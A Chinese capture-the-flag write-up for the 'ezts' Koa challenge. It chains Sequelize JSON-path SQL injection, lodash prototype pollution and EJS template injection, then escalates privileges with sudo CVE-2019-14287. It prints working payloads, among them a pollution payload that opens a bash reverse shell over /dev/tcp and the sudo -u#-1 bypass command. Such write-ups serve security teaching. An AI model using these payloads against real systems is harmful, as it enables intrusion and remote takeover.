# ezts

## 题目简述

题目是一个 Node.js/Koa Web 应用，功能包含注册、登录、档案增加和搜索。搜索功能表现出 SQL 注入特征，结合 Koa 生态可推测后端使用 Sequelize，并可利用 CVE-2019-10752 做盲注获取管理员账号。进入后台后，用户数据以 JSON 合并方式更新，`lodash.defaultsDeep` 对用户可控对象做深合并，导致原型链污染；污染 EJS 模板参数后可以注入命令执行代码，最终再利用 sudo CVE-2019-14287 读取 flag。

题目资料地址：https://github.com/evi0s/ezts

`package.json` 中能确认后端依赖 `koa 2.8.1`、`sequelize 5.15.0`、`lodash 4.17.11`、`ejs 2.7.1` 等版本。`userService.searchProfile()` 调用 `User.findOne`，查询条件包含 `username` 以及 `Sequelize.json("data.${key}", value)` 形式的 JSON 字段查询，对应搜索接口的 Sequelize JSON 查询注入面；后台 `adminService.modifyProfile()` 对 `ctx.request.body.data` 解析出的 JSON 执行 `lodash.defaultsDeep(user.data, data)`，这正是原型链污染触发点。源码和题解链条可以一一对应。

## 解题过程

#### 信息收集

打开这个题目，有登陆，注册的功能。注册完成后登陆进用户界面，发现有增加档案，搜索档案的功能

同时，如果使用了 fuzz 工具，可以发现存在 `/admin/` 路由，也就意味着这题可能的思路就是访问到管理界面。注意到 `Cookie` 有 koa 的键名，基本可以判断后端是 `Node.Js` 的 `Koa` 框架

根据题目描述，基本可以判定这题使用了 ORM 框架，谷歌随便一搜 Koa 的或者 `Node.Js` 的 ORM 框架，就可以找到 `Sequelize` 这个库。也就是说，我们可以大致猜测出后端使用了哪些框架了

在搜索界面，注意到 `'` 可以触发 500 响应，基本可以判定这里存在一个 SQL 注入漏洞

#### SQL 注入

根据我们信息收集的结果，可以对搜索功能进行进一步的 fuzz，但是尝试了多种 SQL 注入 payload 都无果。这里想到猜测的后段 ORM 框架 Sequelize。那么我们去 Snyk.io 去找一下这个框架有没有洞。

CVE-2019-10752 影响 `sequelize` 的 `4.0.0 <= version < 4.44.3` 和 `5.0.0-0 <= version < 5.15.1`，本题使用的 `sequelize 5.15.0` 正好落在受影响范围内。漏洞点在 `sequelize.json()` helper 构造 MySQL/MariaDB/SQLite 的 JSON 子路径查询时，没有正确转义 JSON path；PoC 形态类似把 `target.id')) = 10 UNION SELECT ... --` 放进 JSON path 参数，而 value 仍正常传入。对应到本题，`key` 进入 `Sequelize.json("data.${key}", value)` 的 path 位置，所以可以把公开 PoC 改成时间盲注，确认延时后用布尔盲注注出数据。

这里也不放出脚本了，没有任何过滤的裸的注入，注出第一个用户，也就是 admin，拿到密码就可以直接登陆后台管理了

#### 原型链污染

登陆进入管理后台后，发现有管理用户数据和查询用户数据的功能。而管理用户数据可以直接对用户数据修改。这里注意到查询出的用户数据是 JSON 格式的，也就是说数据库中用户数据大概也是直接存放的。

然后修改用户数据，可以发现提交数据格式必须也是 JSON 格式，而提交的 JSON 会被合并进原来的数据，或者说，会创建新的数据。这里的 JSON 合并也就是 js 的对象合并操作，很容易想到原型链污染这个漏洞

为了测试，我们可以先发一个小的 PoC

```json
{"content": {"constructor": {"prototype": {"a": "b"}}}}
```

提交之后，再查看用户数据，可以发现键 `content` 中的数据消失了，这里可以初步认为存在原型链污染漏洞

（事实上，如果后端是 `express` ，原型链污染的数据会在 HTTP 响应头中显示出来）

还有更多的 PoC，比如

```json
{"content": {"constructor": {"prototype": {"username": "asd"}}}}
```

可以发现刷新后立刻 500，等待服务重启之后 asd 用户也离奇消失了

这是原型链污染在其他依赖库中产生的一些副作用，而实际上，针对这题原型链污染，我对 `Sequelize` 库进行了修改，防止污染之后 ORM 框架出错（因为污染的数据会以键的形式插入到查询语句中）

到这，我们已经基本确定存在原型链污染漏洞了

在源码中，其实也有一个非常明显的原型链污染的提示

```javascript
// const data = ctx.body.data;
if (!user.data) {
    user.data = {};
}

lodash.defaultsDeep(user.data, data);
```

#### ejs getshell

有了原型链污染了，我们可以做些啥呢。这里其实是参考了 X-NUCA 比赛过程中 hard\_js 一题的非预期解。ejs 模版引擎存在代码注入的问题，在遇到原型链污染时，我们可以将 js 代码注入到渲染模版中，最后引发命令执行，拿到 shell

具体的过程这里也不在赘述，payload 如下

```json
{"content": {"constructor": {"prototype": {"outputFunctionName": "a; return global.process.mainModule.constructor._load('child_process').execSync('bash -c "/bin/bash -i > /dev/tcp/ip/port 0<&1 2>&1"'); //"}}}}
```

#### 提权

拿到 shell 后，有师傅发现用户为 node，而根目录下 flag 的文件权限为 0400。通常情况下，一般会预留一个 readflag 的文件来读取 flag，但是本题并没有。

这里使用了一个非常新的 sudo 的 CVE: CVE-2019-14287

那么后续就很简单了

```bash
sudo -l # 查看当前用户 sudo 配置
sudo -u#-1 /bin/cat /flag
```

## 方法总结

- 核心技巧：先用 Sequelize 历史漏洞完成 SQL 注入拿后台权限，再通过 `lodash.defaultsDeep` 触发原型链污染，污染 EJS 渲染选项实现命令执行。
- 识别信号：Koa Cookie、ORM 风格查询、搜索处单引号 500、后台 JSON 合并更新同时出现时，应把 ORM 注入和 JavaScript 原型链污染串起来看。
- 复用要点：原型链污染不一定直接在响应中显现，服务异常、字段消失、ORM 查询键异常都可能是污染成功的副作用；拿 shell 后仍需检查 `sudo -l` 等本地提权面。

